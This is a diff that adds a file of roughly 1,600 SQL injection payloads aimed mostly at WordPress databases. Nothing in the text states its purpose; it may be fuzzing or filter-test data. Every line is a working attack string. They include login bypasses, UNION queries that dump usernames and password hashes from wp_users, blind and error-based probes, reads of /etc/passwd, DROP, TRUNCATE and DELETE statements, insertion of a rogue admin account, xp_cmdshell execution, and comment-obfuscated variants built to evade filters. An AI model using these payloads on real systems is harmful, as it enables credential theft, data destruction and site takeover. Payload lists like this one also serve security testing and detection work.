@@ -1,0 +1,1614 @@
+1 UNION ALL SELECT NULL,NULL,user_pass FROM wp_users--
+1/**/UnIoN/**/SeLeCt/**/1,2,3
+1 UNION/*junk*/SELECT 1,2,3 FROM wp_users
+1 /*!50000UNION*/ /*!50000SELECT*/ user_pass FROM wp_users
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR '1'='1'#
+admin' OR '1'='1'/*
+admin" OR "1"="1"--
+5 or 1=1 --
+1 AND SLEEP(5)
+1' AND SLEEP(5)--
+benchmark(5000000,md5(1))
+x from information_schema.tables
+1; DROP TABLE wp_users
+1'; DROP TABLE wp_users--
+1 and extractvalue(1,concat(0x7e,version()))
+1' AND 1=2 UNION SELECT 1,2,3--
+1' HAVING 1=1--
+1' ORDER BY 10--
+1' GROUP BY 1,2,3--
+1' AND (SELECT COUNT(*) FROM wp_users)>0--
+1' AND ASCII(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1))>64--
+1'; WAITFOR DELAY '0:0:5'--
+1' AND PG_SLEEP(5)--
+' OR true--
+1' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--
+1) OR (1=1
+1') OR ('1'='1
+1' INTO OUTFILE '/tmp/x'--
+1' UNION SELECT @@version,user(),database()--
+1' AND EXP(~(SELECT * FROM (SELECT USER())a))--
+1' AND FLOOR(RAND(0)*2) GROUP BY x--
+1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+1' AND GTID_SUBSET(CONCAT(0x7e,version()),1)--
+1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
+1' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
+1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
+1' UNION SELECT LOAD_FILE('/etc/passwd')--
+1' UNION SELECT table_name FROM information_schema.tables--
+1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='wp_users'--
+1' UNION SELECT sql FROM sqlite_master--
+1' UNION SELECT usename,passwd FROM pg_catalog.pg_shadow--
+1' AND 1 IN (SELECT user_pass FROM wp_users)--
+1' AND EXISTS(SELECT * FROM wp_users WHERE user_login='admin')--
+1'; INSERT INTO wp_users(user_login,user_pass) VALUES('evil','hash')--
+1'; UPDATE wp_users SET user_pass='x' WHERE ID=1--
+1'; DELETE FROM wp_posts WHERE ID>0--
+1'; TRUNCATE TABLE wp_options--
+1'; EXEC xp_cmdshell('whoami')--
+1'; DECLARE @q VARCHAR(99); EXEC(@q)--
+1' AND IF(1=1,SLEEP(5),0)--
+1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
+1' OR 1=1 LIMIT 1--
+1' AND 'a' LIKE 'a'--
+1' AND 'a' RLIKE 'a'--
+1' AND 'a' REGEXP '.*'--
+1' XOR 1=1--
+1' || 1=1--
+1' && 1=1--
+1' AND 1!=2--
+1' AND 1<>2--
+1' AND 1<=>1--
+1' AND NOT 0=1--
+1' OR 1 IS NOT NULL--
+-1 UNION SELECT 1,2,3--
+-1' UNION SELECT 1,2,3--
+0' UNION ALL SELECT 1,GROUP_CONCAT(user_login,0x3a,user_pass) FROM wp_users--
+1 OR 1=1-- 
+1 OR 2=2-- 
+1 OR 1!=2-- 
+1 OR 1<>2-- 
+1 OR 1<=>1-- 
+1 OR 'a'='a'-- 
+1 OR "a"="a"-- 
+1 OR 1 LIKE 1-- 
+1 OR 'x' LIKE 'x'-- 
+1 OR 1>0-- 
+1 OR 1<2-- 
+1 OR 1<=1-- 
+1 OR 1>=1-- 
+1 AND 1=1-- 
+1 AND 2=2-- 
+1 AND 1!=2-- 
+1 AND 1<>2-- 
+1 AND 1<=>1-- 
+1 AND 'a'='a'-- 
+1 AND "a"="a"-- 
+1 AND 1 LIKE 1-- 
+1 AND 'x' LIKE 'x'-- 
+1 AND 1>0-- 
+1 AND 1<2-- 
+1 AND 1<=1-- 
+1 AND 1>=1-- 
+1 XOR 1=1-- 
+1 XOR 2=2-- 
+1 XOR 1!=2-- 
+1 XOR 1<>2-- 
+1 XOR 1<=>1-- 
+1 XOR 'a'='a'-- 
+1 XOR "a"="a"-- 
+1 XOR 1 LIKE 1-- 
+1 XOR 'x' LIKE 'x'-- 
+1 XOR 1>0-- 
+1 XOR 1<2-- 
+1 XOR 1<=1-- 
+1 XOR 1>=1-- 
+1 || 1=1-- 
+1 || 2=2-- 
+1 || 1!=2-- 
+1 || 1<>2-- 
+1 || 1<=>1-- 
+1 || 'a'='a'-- 
+1 || "a"="a"-- 
+1 || 1 LIKE 1-- 
+1 || 'x' LIKE 'x'-- 
+1 || 1>0-- 
+1 || 1<2-- 
+1 || 1<=1-- 
+1 || 1>=1-- 
+1 && 1=1-- 
+1 && 2=2-- 
+1 && 1!=2-- 
+1 && 1<>2-- 
+1 && 1<=>1-- 
+1 && 'a'='a'-- 
+1 && "a"="a"-- 
+1 && 1 LIKE 1-- 
+1 && 'x' LIKE 'x'-- 
+1 && 1>0-- 
+1 && 1<2-- 
+1 && 1<=1-- 
+1 && 1>=1-- 
+1' OR 1=1#
+1' OR 2=2#
+1' OR 1!=2#
+1' OR 1<>2#
+1' OR 1<=>1#
+1' OR 'a'='a
+1' OR 1 LIKE 1#
+1' OR 'x' LIKE 'x'#
+1' OR true#
+1' OR 1>0#
+1' OR 1<2#
+1' OR 1<=1#
+1' OR 1>=1#
+1' AND 1=1#
+1' AND 2=2#
+1' AND 1!=2#
+1' AND 1<>2#
+1' AND 1<=>1#
+1' AND 'a'='a
+1' AND 1 LIKE 1#
+1' AND 'x' LIKE 'x'#
+1' AND true#
+1' AND 1>0#
+1' AND 1<2#
+1' AND 1<=1#
+1' AND 1>=1#
+1' XOR 1=1#
+1' XOR 2=2#
+1' XOR 1!=2#
+1' XOR 1<>2#
+1' XOR 1<=>1#
+1' XOR 'a'='a
+1' XOR 1 LIKE 1#
+1' XOR 'x' LIKE 'x'#
+1' XOR true#
+1' XOR 1>0#
+1' XOR 1<2#
+1' XOR 1<=1#
+1' XOR 1>=1#
+1' || 1=1#
+1' || 2=2#
+1' || 1!=2#
+1' || 1<>2#
+1' || 1<=>1#
+1' || 'a'='a
+1' || 1 LIKE 1#
+1' || 'x' LIKE 'x'#
+1' || true#
+1' || 1>0#
+1' || 1<2#
+1' || 1<=1#
+1' || 1>=1#
+1' && 1=1#
+1' && 2=2#
+1' && 1!=2#
+1' && 1<>2#
+1' && 1<=>1#
+1' && 'a'='a
+1' && 1 LIKE 1#
+1' && 'x' LIKE 'x'#
+1' && true#
+1' && 1>0#
+1' && 1<2#
+1' && 1<=1#
+1' && 1>=1#
+1" OR 1=1#
+1" OR 2=2#
+1" OR 1!=2#
+1" OR 1<>2#
+1" OR 1<=>1#
+1" OR "a"="a
+1" OR 1 LIKE 1#
+1" OR true#
+1" OR 1>0#
+1" OR 1<2#
+1" OR 1<=1#
+1" OR 1>=1#
+1" AND 1=1#
+1" AND 2=2#
+1" AND 1!=2#
+1" AND 1<>2#
+1" AND 1<=>1#
+1" AND "a"="a
+1" AND 1 LIKE 1#
+1" AND true#
+1" AND 1>0#
+1" AND 1<2#
+1" AND 1<=1#
+1" AND 1>=1#
+1" XOR 1=1#
+1" XOR 2=2#
+1" XOR 1!=2#
+1" XOR 1<>2#
+1" XOR 1<=>1#
+1" XOR "a"="a
+1" XOR 1 LIKE 1#
+1" XOR true#
+1" XOR 1>0#
+1" XOR 1<2#
+1" XOR 1<=1#
+1" XOR 1>=1#
+1" || 1=1#
+1" || 2=2#
+1" || 1!=2#
+1" || 1<>2#
+1" || 1<=>1#
+1" || "a"="a
+1" || 1 LIKE 1#
+1" || true#
+1" || 1>0#
+1" || 1<2#
+1" || 1<=1#
+1" || 1>=1#
+1" && 1=1#
+1" && 2=2#
+1" && 1!=2#
+1" && 1<>2#
+1" && 1<=>1#
+1" && "a"="a
+1" && 1 LIKE 1#
+1" && true#
+1" && 1>0#
+1" && 1<2#
+1" && 1<=1#
+1" && 1>=1#
+1) OR 1=1-- 
+1) OR 2=2-- 
+1) OR 1!=2-- 
+1) OR 1<>2-- 
+1) OR 1<=>1-- 
+1) OR 'a'='a'-- 
+1) OR "a"="a"-- 
+1) OR 1 LIKE 1-- 
+1) OR 'x' LIKE 'x'-- 
+1) OR true-- 
+1) OR 1>0-- 
+1) OR 1<2-- 
+1) OR 1<=1-- 
+1) OR 1>=1-- 
+1) AND 1=1-- 
+1) AND 2=2-- 
+1) AND 1!=2-- 
+1) AND 1<>2-- 
+1) AND 1<=>1-- 
+1) AND 'a'='a'-- 
+1) AND "a"="a"-- 
+1) AND 1 LIKE 1-- 
+1) AND 'x' LIKE 'x'-- 
+1) AND true-- 
+1) AND 1>0-- 
+1) AND 1<2-- 
+1) AND 1<=1-- 
+1) AND 1>=1-- 
+1) XOR 1=1-- 
+1) XOR 2=2-- 
+1) XOR 1!=2-- 
+1) XOR 1<>2-- 
+1) XOR 1<=>1-- 
+1) XOR 'a'='a'-- 
+1) XOR "a"="a"-- 
+1) XOR 1 LIKE 1-- 
+1) XOR 'x' LIKE 'x'-- 
+1) XOR true-- 
+1) XOR 1>0-- 
+1) XOR 1<2-- 
+1) XOR 1<=1-- 
+1) XOR 1>=1-- 
+1) || 1=1-- 
+1) || 2=2-- 
+1) || 1!=2-- 
+1) || 1<>2-- 
+1) || 1<=>1-- 
+1) || 'a'='a'-- 
+1) || "a"="a"-- 
+1) || 1 LIKE 1-- 
+1) || 'x' LIKE 'x'-- 
+1) || true-- 
+1) || 1>0-- 
+1) || 1<2-- 
+1) || 1<=1-- 
+1) || 1>=1-- 
+1) && 1=1-- 
+1) && 2=2-- 
+1) && 1!=2-- 
+1) && 1<>2-- 
+1) && 1<=>1-- 
+1) && 'a'='a'-- 
+1) && "a"="a"-- 
+1) && 1 LIKE 1-- 
+1) && 'x' LIKE 'x'-- 
+1) && true-- 
+1) && 1>0-- 
+1) && 1<2-- 
+1) && 1<=1-- 
+1) && 1>=1-- 
+1') OR 1=1#
+1') OR 2=2#
+1') OR 1!=2#
+1') OR 1<>2#
+1') OR 1<=>1#
+1') OR 'a'='a'#
+1') OR "a"="a"#
+1') OR 1 LIKE 1#
+1') OR 'x' LIKE 'x'#
+1') OR true#
+1') OR 1>0#
+1') OR 1<2#
+1') OR 1<=1#
+1') OR 1>=1#
+1') AND 1=1#
+1') AND 2=2#
+1') AND 1!=2#
+1') AND 1<>2#
+1') AND 1<=>1#
+1') AND 'a'='a'#
+1') AND "a"="a"#
+1') AND 1 LIKE 1#
+1') AND 'x' LIKE 'x'#
+1') AND true#
+1') AND 1>0#
+1') AND 1<2#
+1') AND 1<=1#
+1') AND 1>=1#
+1') XOR 1=1#
+1') XOR 2=2#
+1') XOR 1!=2#
+1') XOR 1<>2#
+1') XOR 1<=>1#
+1') XOR 'a'='a'#
+1') XOR "a"="a"#
+1') XOR 1 LIKE 1#
+1') XOR 'x' LIKE 'x'#
+1') XOR true#
+1') XOR 1>0#
+1') XOR 1<2#
+1') XOR 1<=1#
+1') XOR 1>=1#
+1') || 1=1#
+1') || 2=2#
+1') || 1!=2#
+1') || 1<>2#
+1') || 1<=>1#
+1') || 'a'='a'#
+1') || "a"="a"#
+1') || 1 LIKE 1#
+1') || 'x' LIKE 'x'#
+1') || true#
+1') || 1>0#
+1') || 1<2#
+1') || 1<=1#
+1') || 1>=1#
+1') && 1=1#
+1') && 2=2#
+1') && 1!=2#
+1') && 1<>2#
+1') && 1<=>1#
+1') && 'a'='a'#
+1') && "a"="a"#
+1') && 1 LIKE 1#
+1') && 'x' LIKE 'x'#
+1') && true#
+1') && 1>0#
+1') && 1<2#
+1') && 1<=1#
+1') && 1>=1#
+1") OR 1=1#
+1") OR 2=2#
+1") OR 1!=2#
+1") OR 1<>2#
+1") OR 1<=>1#
+1") OR 'a'='a'#
+1") OR "a"="a"#
+1") OR 1 LIKE 1#
+1") OR 'x' LIKE 'x'#
+1") OR true#
+1") OR 1>0#
+1") OR 1<2#
+1") OR 1<=1#
+1") OR 1>=1#
+1") AND 1=1#
+1") AND 2=2#
+1") AND 1!=2#
+1") AND 1<>2#
+1") AND 1<=>1#
+1") AND 'a'='a'#
+1") AND "a"="a"#
+1") AND 1 LIKE 1#
+1") AND 'x' LIKE 'x'#
+1") AND true#
+1") AND 1>0#
+1") AND 1<2#
+1") AND 1<=1#
+1") AND 1>=1#
+1") XOR 1=1#
+1") XOR 2=2#
+1") XOR 1!=2#
+1") XOR 1<>2#
+1") XOR 1<=>1#
+1") XOR 'a'='a'#
+1") XOR "a"="a"#
+1") XOR 1 LIKE 1#
+1") XOR 'x' LIKE 'x'#
+1") XOR true#
+1") XOR 1>0#
+1") XOR 1<2#
+1") XOR 1<=1#
+1") XOR 1>=1#
+1") || 1=1#
+1") || 2=2#
+1") || 1!=2#
+1") || 1<>2#
+1") || 1<=>1#
+1") || 'a'='a'#
+1") || "a"="a"#
+1") || 1 LIKE 1#
+1") || 'x' LIKE 'x'#
+1") || true#
+1") || 1>0#
+1") || 1<2#
+1") || 1<=1#
+1") || 1>=1#
+1") && 1=1#
+1") && 2=2#
+1") && 1!=2#
+1") && 1<>2#
+1") && 1<=>1#
+1") && 'a'='a'#
+1") && "a"="a"#
+1") && 1 LIKE 1#
+1") && 'x' LIKE 'x'#
+1") && true#
+1") && 1>0#
+1") && 1<2#
+1") && 1<=1#
+1") && 1>=1#
+admin' OR 1=1#
+admin' OR 2=2#
+admin' OR 1!=2#
+admin' OR 1<>2#
+admin' OR 1<=>1#
+admin' OR 'a'='a
+admin' OR 1 LIKE 1#
+admin' OR 'x' LIKE 'x'#
+admin' OR true#
+admin' OR 1>0#
+admin' OR 1<2#
+admin' OR 1<=1#
+admin' OR 1>=1#
+admin' AND 1=1#
+admin' AND 2=2#
+admin' AND 1!=2#
+admin' AND 1<>2#
+admin' AND 1<=>1#
+admin' AND 'a'='a
+admin' AND 1 LIKE 1#
+admin' AND 'x' LIKE 'x'#
+admin' AND true#
+admin' AND 1>0#
+admin' AND 1<2#
+admin' AND 1<=1#
+admin' AND 1>=1#
+admin' XOR 1=1#
+admin' XOR 2=2#
+admin' XOR 1!=2#
+admin' XOR 1<>2#
+admin' XOR 1<=>1#
+admin' XOR 'a'='a
+admin' XOR 1 LIKE 1#
+admin' XOR 'x' LIKE 'x'#
+admin' XOR true#
+admin' XOR 1>0#
+admin' XOR 1<2#
+admin' XOR 1<=1#
+admin' XOR 1>=1#
+admin' || 1=1#
+admin' || 2=2#
+admin' || 1!=2#
+admin' || 1<>2#
+admin' || 1<=>1#
+admin' || 'a'='a
+admin' || 1 LIKE 1#
+admin' || 'x' LIKE 'x'#
+admin' || true#
+admin' || 1>0#
+admin' || 1<2#
+admin' || 1<=1#
+admin' || 1>=1#
+admin' && 1=1#
+admin' && 2=2#
+admin' && 1!=2#
+admin' && 1<>2#
+admin' && 1<=>1#
+admin' && 'a'='a
+admin' && 1 LIKE 1#
+admin' && 'x' LIKE 'x'#
+admin' && true#
+admin' && 1>0#
+admin' && 1<2#
+admin' && 1<=1#
+admin' && 1>=1#
+admin" OR 1=1#
+admin" OR 2=2#
+admin" OR 1!=2#
+admin" OR 1<>2#
+admin" OR 1<=>1#
+admin" OR "a"="a
+admin" OR 1 LIKE 1#
+admin" OR true#
+admin" OR 1>0#
+admin" OR 1<2#
+admin" OR 1<=1#
+admin" OR 1>=1#
+admin" AND 1=1#
+admin" AND 2=2#
+admin" AND 1!=2#
+admin" AND 1<>2#
+admin" AND 1<=>1#
+admin" AND "a"="a
+admin" AND 1 LIKE 1#
+admin" AND true#
+admin" AND 1>0#
+admin" AND 1<2#
+admin" AND 1<=1#
+admin" AND 1>=1#
+admin" XOR 1=1#
+admin" XOR 2=2#
+admin" XOR 1!=2#
+admin" XOR 1<>2#
+admin" XOR 1<=>1#
+admin" XOR "a"="a
+admin" XOR 1 LIKE 1#
+admin" XOR true#
+admin" XOR 1>0#
+admin" XOR 1<2#
+admin" XOR 1<=1#
+admin" XOR 1>=1#
+admin" || 1=1#
+admin" || 2=2#
+admin" || 1!=2#
+admin" || 1<>2#
+admin" || 1<=>1#
+admin" || "a"="a
+admin" || 1 LIKE 1#
+admin" || true#
+admin" || 1>0#
+admin" || 1<2#
+admin" || 1<=1#
+admin" || 1>=1#
+admin" && 1=1#
+admin" && 2=2#
+admin" && 1!=2#
+admin" && 1<>2#
+admin" && 1<=>1#
+admin" && "a"="a
+admin" && 1 LIKE 1#
+admin" && true#
+admin" && 1>0#
+admin" && 1<2#
+admin" && 1<=1#
+admin" && 1>=1#
+-1 OR 1=1-- 
+-1 OR 2=2-- 
+-1 OR 1!=2-- 
+-1 OR 1<>2-- 
+-1 OR 1<=>1-- 
+-1 OR 'a'='a'-- 
+-1 OR "a"="a"-- 
+-1 OR 1 LIKE 1-- 
+-1 OR 'x' LIKE 'x'-- 
+-1 OR 1>0-- 
+-1 OR 1<2-- 
+-1 OR 1<=1-- 
+-1 OR 1>=1-- 
+-1 AND 1=1-- 
+-1 AND 2=2-- 
+-1 AND 1!=2-- 
+-1 AND 1<>2-- 
+-1 AND 1<=>1-- 
+-1 AND 'a'='a'-- 
+-1 AND "a"="a"-- 
+-1 AND 1 LIKE 1-- 
+-1 AND 'x' LIKE 'x'-- 
+-1 AND 1>0-- 
+-1 AND 1<2-- 
+-1 AND 1<=1-- 
+-1 AND 1>=1-- 
+-1 XOR 1=1-- 
+-1 XOR 2=2-- 
+-1 XOR 1!=2-- 
+-1 XOR 1<>2-- 
+-1 XOR 1<=>1-- 
+-1 XOR 'a'='a'-- 
+-1 XOR "a"="a"-- 
+-1 XOR 1 LIKE 1-- 
+-1 XOR 'x' LIKE 'x'-- 
+-1 XOR 1>0-- 
+-1 XOR 1<2-- 
+-1 XOR 1<=1-- 
+-1 XOR 1>=1-- 
+-1 || 1=1-- 
+-1 || 2=2-- 
+-1 || 1!=2-- 
+-1 || 1<>2-- 
+-1 || 1<=>1-- 
+-1 || 'a'='a'-- 
+-1 || "a"="a"-- 
+-1 || 1 LIKE 1-- 
+-1 || 'x' LIKE 'x'-- 
+-1 || 1>0-- 
+-1 || 1<2-- 
+-1 || 1<=1-- 
+-1 || 1>=1-- 
+-1 && 1=1-- 
+-1 && 2=2-- 
+-1 && 1!=2-- 
+-1 && 1<>2-- 
+-1 && 1<=>1-- 
+-1 && 'a'='a'-- 
+-1 && "a"="a"-- 
+-1 && 1 LIKE 1-- 
+-1 && 'x' LIKE 'x'-- 
+-1 && 1>0-- 
+-1 && 1<2-- 
+-1 && 1<=1-- 
+-1 && 1>=1-- 
+-1' OR 1=1#
+-1' OR 2=2#
+-1' OR 1!=2#
+-1' OR 1<>2#
+-1' OR 1<=>1#
+-1' OR 'a'='a
+-1' OR 1 LIKE 1#
+-1' OR 'x' LIKE 'x'#
+-1' OR true#
+-1' OR 1>0#
+-1' OR 1<2#
+-1' OR 1<=1#
+-1' OR 1>=1#
+-1' AND 1=1#
+-1' AND 2=2#
+-1' AND 1!=2#
+-1' AND 1<>2#
+-1' AND 1<=>1#
+-1' AND 'a'='a
+-1' AND 1 LIKE 1#
+-1' AND 'x' LIKE 'x'#
+-1' AND true#
+-1' AND 1>0#
+-1' AND 1<2#
+-1' AND 1<=1#
+-1' AND 1>=1#
+-1' XOR 1=1#
+-1' XOR 2=2#
+-1' XOR 1!=2#
+-1' XOR 1<>2#
+-1' XOR 1<=>1#
+-1' XOR 'a'='a
+-1' XOR 1 LIKE 1#
+-1' XOR 'x' LIKE 'x'#
+-1' XOR true#
+-1' XOR 1>0#
+-1' XOR 1<2#
+-1' XOR 1<=1#
+-1' XOR 1>=1#
+-1' || 1=1#
+-1' || 2=2#
+-1' || 1!=2#
+-1' || 1<>2#
+-1' || 1<=>1#
+-1' || 'a'='a
+-1' || 1 LIKE 1#
+-1' || 'x' LIKE 'x'#
+-1' || true#
+-1' || 1>0#
+-1' || 1<2#
+-1' || 1<=1#
+-1' || 1>=1#
+-1' && 1=1#
+-1' && 2=2#
+-1' && 1!=2#
+-1' && 1<>2#
+-1' && 1<=>1#
+-1' && 'a'='a
+-1' && 1 LIKE 1#
+-1' && 'x' LIKE 'x'#
+-1' && true#
+-1' && 1>0#
+-1' && 1<2#
+-1' && 1<=1#
+-1' && 1>=1#
+' OR 1=1#
+' OR 2=2#
+' OR 1!=2#
+' OR 1<>2#
+' OR 1<=>1#
+' OR 'a'='a
+' OR 1 LIKE 1#
+' OR 'x' LIKE 'x'#
+' OR true#
+' OR 1>0#
+' OR 1<2#
+' OR 1<=1#
+' OR 1>=1#
+' AND 1=1#
+' AND 2=2#
+' AND 1!=2#
+' AND 1<>2#
+' AND 1<=>1#
+' AND 'a'='a
+' AND 1 LIKE 1#
+' AND 'x' LIKE 'x'#
+' AND true#
+' AND 1>0#
+' AND 1<2#
+' AND 1<=1#
+' AND 1>=1#
+' XOR 1=1#
+' XOR 2=2#
+' XOR 1!=2#
+' XOR 1<>2#
+' XOR 1<=>1#
+' XOR 'a'='a
+' XOR 1 LIKE 1#
+' XOR 'x' LIKE 'x'#
+' XOR true#
+' XOR 1>0#
+' XOR 1<2#
+' XOR 1<=1#
+' XOR 1>=1#
+' || 1=1#
+' || 2=2#
+' || 1!=2#
+' || 1<>2#
+' || 1<=>1#
+' || 'a'='a
+' || 1 LIKE 1#
+' || 'x' LIKE 'x'#
+' || true#
+' || 1>0#
+' || 1<2#
+' || 1<=1#
+' || 1>=1#
+' && 1=1#
+' && 2=2#
+' && 1!=2#
+' && 1<>2#
+' && 1<=>1#
+' && 'a'='a
+' && 1 LIKE 1#
+' && 'x' LIKE 'x'#
+' && true#
+' && 1>0#
+' && 1<2#
+' && 1<=1#
+' && 1>=1#
+" OR 1=1#
+" OR 2=2#
+" OR 1!=2#
+" OR 1<>2#
+" OR 1<=>1#
+" OR "a"="a
+" OR 1 LIKE 1#
+" OR true#
+" OR 1>0#
+" OR 1<2#
+" OR 1<=1#
+" OR 1>=1#
+" AND 1=1#
+" AND 2=2#
+" AND 1!=2#
+" AND 1<>2#
+" AND 1<=>1#
+" AND "a"="a
+" AND 1 LIKE 1#
+" AND true#
+" AND 1>0#
+" AND 1<2#
+" AND 1<=1#
+" AND 1>=1#
+" XOR 1=1#
+" XOR 2=2#
+" XOR 1!=2#
+" XOR 1<>2#
+" XOR 1<=>1#
+" XOR "a"="a
+" XOR 1 LIKE 1#
+" XOR true#
+" XOR 1>0#
+" XOR 1<2#
+" XOR 1<=1#
+" XOR 1>=1#
+" || 1=1#
+" || 2=2#
+" || 1!=2#
+" || 1<>2#
+" || 1<=>1#
+" || "a"="a
+" || 1 LIKE 1#
+" || true#
+" || 1>0#
+" || 1<2#
+" || 1<=1#
+" || 1>=1#
+" && 1=1#
+" && 2=2#
+" && 1!=2#
+" && 1<>2#
+" && 1<=>1#
+" && "a"="a
+" && 1 LIKE 1#
+" && true#
+" && 1>0#
+" && 1<2#
+" && 1<=1#
+" && 1>=1#
+1 UNION SELECT 1,2,3-- 
+1 UNION SELECT NULL,NULL,NULL-- 
+1 UNION SELECT user_login,user_pass FROM wp_users-- 
+1 UNION SELECT @@version,user(),database()-- 
+1 UNION SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1 UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1 UNION SELECT CHAR(65,66,67),2,3-- 
+1 UNION SELECT hex(user_pass) FROM wp_users-- 
+1 UNION SELECT version(),schema(),current_user()-- 
+1 UNION ALL SELECT 1,2,3-- 
+1 UNION ALL SELECT NULL,NULL,NULL-- 
+1 UNION ALL SELECT user_login,user_pass FROM wp_users-- 
+1 UNION ALL SELECT @@version,user(),database()-- 
+1 UNION ALL SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1 UNION ALL SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1 UNION ALL SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1 UNION ALL SELECT CHAR(65,66,67),2,3-- 
+1 UNION ALL SELECT hex(user_pass) FROM wp_users-- 
+1 UNION ALL SELECT version(),schema(),current_user()-- 
+1 UNION DISTINCT SELECT 1,2,3-- 
+1 UNION DISTINCT SELECT NULL,NULL,NULL-- 
+1 UNION DISTINCT SELECT user_login,user_pass FROM wp_users-- 
+1 UNION DISTINCT SELECT @@version,user(),database()-- 
+1 UNION DISTINCT SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1 UNION DISTINCT SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1 UNION DISTINCT SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1 UNION DISTINCT SELECT CHAR(65,66,67),2,3-- 
+1 UNION DISTINCT SELECT hex(user_pass) FROM wp_users-- 
+1 UNION DISTINCT SELECT version(),schema(),current_user()-- 
+1 /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- 
+1 /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL-- 
+1 /*!50000UNION*/ /*!50000SELECT*/ user_login,user_pass FROM wp_users-- 
+1 /*!50000UNION*/ /*!50000SELECT*/ @@version,user(),database()-- 
+1 /*!50000UNION*/ /*!50000SELECT*/ CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1 /*!50000UNION*/ /*!50000SELECT*/ GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1 /*!50000UNION*/ /*!50000SELECT*/ LOAD_FILE('/etc/passwd'),2,3-- 
+1 /*!50000UNION*/ /*!50000SELECT*/ CHAR(65,66,67),2,3-- 
+1 /*!50000UNION*/ /*!50000SELECT*/ hex(user_pass) FROM wp_users-- 
+1 /*!50000UNION*/ /*!50000SELECT*/ version(),schema(),current_user()-- 
+1 UNION/*abc*/SELECT 1,2,3-- 
+1 UNION/*abc*/SELECT NULL,NULL,NULL-- 
+1 UNION/*abc*/SELECT user_login,user_pass FROM wp_users-- 
+1 UNION/*abc*/SELECT @@version,user(),database()-- 
+1 UNION/*abc*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1 UNION/*abc*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1 UNION/*abc*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1 UNION/*abc*/SELECT CHAR(65,66,67),2,3-- 
+1 UNION/*abc*/SELECT hex(user_pass) FROM wp_users-- 
+1 UNION/*abc*/SELECT version(),schema(),current_user()-- 
+1 /**//*!12345UNION*/SELECT 1,2,3-- 
+1 /**//*!12345UNION*/SELECT NULL,NULL,NULL-- 
+1 /**//*!12345UNION*/SELECT user_login,user_pass FROM wp_users-- 
+1 /**//*!12345UNION*/SELECT @@version,user(),database()-- 
+1 /**//*!12345UNION*/SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+1 /**//*!12345UNION*/SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+1 /**//*!12345UNION*/SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+1 /**//*!12345UNION*/SELECT CHAR(65,66,67),2,3-- 
+1 /**//*!12345UNION*/SELECT hex(user_pass) FROM wp_users-- 
+1 /**//*!12345UNION*/SELECT version(),schema(),current_user()-- 
+-1 UNION SELECT 1,2,3-- 
+-1 UNION SELECT NULL,NULL,NULL-- 
+-1 UNION SELECT user_login,user_pass FROM wp_users-- 
+-1 UNION SELECT @@version,user(),database()-- 
+-1 UNION SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+-1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+-1 UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+-1 UNION SELECT CHAR(65,66,67),2,3-- 
+-1 UNION SELECT hex(user_pass) FROM wp_users-- 
+-1 UNION SELECT version(),schema(),current_user()-- 
+-1 UNION ALL SELECT 1,2,3-- 
+-1 UNION ALL SELECT NULL,NULL,NULL-- 
+-1 UNION ALL SELECT user_login,user_pass FROM wp_users-- 
+-1 UNION ALL SELECT @@version,user(),database()-- 
+-1 UNION ALL SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+-1 UNION ALL SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+-1 UNION ALL SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+-1 UNION ALL SELECT CHAR(65,66,67),2,3-- 
+-1 UNION ALL SELECT hex(user_pass) FROM wp_users-- 
+-1 UNION ALL SELECT version(),schema(),current_user()-- 
+-1 UNION DISTINCT SELECT 1,2,3-- 
+-1 UNION DISTINCT SELECT NULL,NULL,NULL-- 
+-1 UNION DISTINCT SELECT user_login,user_pass FROM wp_users-- 
+-1 UNION DISTINCT SELECT @@version,user(),database()-- 
+-1 UNION DISTINCT SELECT CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
+-1 UNION DISTINCT SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- 
+-1 UNION DISTINCT SELECT LOAD_FILE('/etc/passwd'),2,3-- 
+-1 UNION DISTINCT SELECT CHAR(65,66,67),2,3-- 
+-1 UNION DISTINCT SELECT hex(user_pass) FROM wp_users-- 
+-1 UNION DISTINCT SELECT version(),schema(),current_user()-- 
+-1 /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- 
+-1 /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL-- 
+-1 /*!50000UNION*/ /*!50000SELECT*/ user_login,user_pass FROM wp_users-- 
+-1 /*!50000UNION*/ /*!50000SELECT*/ @@version,user(),database()-- 
+-1 /*!50000UNION*/ /*!50000SELECT*/ CONCAT(user_login,0x3a,user_pass) FROM wp_users-- 
